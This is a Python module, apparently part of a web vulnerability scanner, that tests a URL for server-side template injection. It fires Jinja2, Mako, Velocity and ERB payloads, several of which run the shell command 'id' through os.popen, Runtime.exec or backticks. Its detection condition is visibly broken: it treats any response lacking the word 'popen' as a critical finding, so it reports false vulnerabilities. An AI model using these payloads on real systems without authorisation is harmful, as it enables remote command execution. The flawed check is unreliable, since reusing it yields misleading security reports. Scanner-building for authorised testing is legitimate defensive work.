#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Server-Side Template Injection (SSTI) Detector
"""

import re
from typing import List, Dict, Any
from loguru import logger

from .base import BaseDetector


class SSTIDetector(BaseDetector):
    """Server-Side Template Injection Tespiti"""
    
    # SSTI payload'ları - Farklı template engine'ler için
    SSTI_PAYLOADS = {
        'jinja2': [
            "{{7*7}}",  # 49
            "{{config}}",
            "{{self.__dict__}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        'mako': [
            "${7*7}",
            "${__import__('os').popen('id').read()}",
        ],
        'velocity': [
            "#set($x=7*7)$x",
            "#set($rt = $classloader.loadClass('java.lang.Runtime'))#set($chr = $classloader.loadClass('java.lang.Character'))#set($str = $classloader.loadClass('java.lang.String'))$rt.getRuntime().exec('id')",
        ],
        'erb': [
            "<%= 7*7 %>",
            "<%= `id` %>",
        ],
    }
    
    async def scan(self, url: str, **kwargs) -> List[Dict[str, Any]]:
        """
        SSTI taraması
        
        Args:
            url: Hedef URL
        
        Returns:
            Bulunan SSTI zafiyetleri
        """
        vulnerabilities = []
        logger.debug(f"🐛 SSTI taraması başlanıyor: {url}")
        
        try:
            for engine, payloads in self.SSTI_PAYLOADS.items():
                for payload in payloads:
                    test_url = f"{url}?template={payload}"
                    response = await self._get(test_url)
                    
                    if response:
                        # 49 sonucu ara (7*7)
                        if '49' in response or 'config' in response or 'popen' not in response:
                            vuln = self._create_vulnerability(
                                type_=f'Server-Side Template Injection ({engine})',
                                severity='Critical',
                                url=url,
                                description=f'{engine} Template Injection - RCE mümkün',
                                recommendation='Template inputı saın, sandbox kullan',
                                poc=payload,
                                cwe='CWE-1336',
                                cvss_vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'
                            )
                            vulnerabilities.append(vuln)
                            break
        
        except Exception as e:
            logger.debug(f"❌ SSTI tarama hatası: {str(e)}")
        
        return vulnerabilities
